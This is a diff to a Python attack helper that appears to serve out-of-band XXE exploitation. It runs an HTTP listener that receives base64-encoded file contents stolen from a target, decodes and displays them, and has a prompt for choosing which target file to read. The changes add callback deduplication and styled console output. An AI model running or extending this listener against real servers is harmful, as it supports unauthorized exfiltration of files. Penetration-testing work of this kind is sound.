@@ -1,10 +1,23 @@
 import threading
+import time
 from cmd import Cmd
 import http.server
 from base64 import b64decode
 from urllib.parse import urlparse, parse_qs
 
+from rich.console import Console
+from rich.panel import Panel
+from rich.text import Text
+
+console = Console()
+
 payload = "Dummy string"
+
+# Some XML parsers resolve the OOB parameter entity twice for a single
+# request (once loading the DTD, once expanding it), producing two
+# identical requests within milliseconds. Suppress the repeat print.
+DEDUPE_WINDOW = 2  # seconds
+_seen_content: dict[str, float] = {}
 
 # TODO To parse the .req file, and then get the relevant data and make the request
 # TODO Add argparse to get the .req filename dynamically, and also the attacker's IP and port for the OOB request
@@ -34,13 +47,22 @@ class RequestHandler(http.server.BaseHTTPRequestHandler):
             params = parse_qs(parsed.query)
 
             b64_value = params["content"][0]
+            now = time.time()
+            last_seen = _seen_content.get(b64_value)
+            _seen_content[b64_value] = now
+            if last_seen is not None and now - last_seen < DEDUPE_WINDOW:
+                return
+
             decoded = b64decode(b64_value).decode()
-            print(f"\nDecoded Content:\n{decoded}\n")
-            print(terminal.prompt, end="", flush=True)
+            print()
+            console.print(
+                Panel(Text(decoded), title="Decoded Content", border_style="green")
+            )
+            console.print(terminal.prompt, end="", highlight=False)
             return
         else:
-            print("Uninteneded request: {}".format(self.path))
-            print(terminal.prompt, end="", flush=True)
+            console.print(f"[yellow]Unintended request:[/yellow] {self.path}")
+            console.print(terminal.prompt, end="", highlight=False)
             return
 
 
@@ -56,7 +78,7 @@ class Terminal(Cmd):
 
         payload = temp_payload
         # TODO To make the request from here itself, instead of burp
-        print(f"The file is {line}")
+        console.print(f"[cyan]Target file set:[/cyan] {line}")
 
     def do_exit(self, arg):
         exit()
